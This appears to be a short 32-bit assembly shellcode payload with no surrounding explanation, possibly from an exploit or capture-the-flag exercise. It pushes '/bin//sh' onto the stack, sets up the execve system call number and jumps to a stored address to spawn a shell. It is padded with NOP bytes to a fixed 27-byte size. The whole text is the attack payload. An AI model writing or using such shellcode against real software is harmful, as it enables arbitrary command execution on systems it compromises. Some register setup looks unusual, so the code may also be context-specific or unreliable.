BITS 32
start:
  mov eax, gs
  mov ds, ax              
  mov ebp, [ebx + 0x10]   
  push 0x68732f2f        ; "hs//"
  push 0x6e69622f        ; "nib/"
  mov ebx, esp
  xor eax, eax
  mov al, 0x0b
  jmp ebp
times 27 - ($-$$) db 90h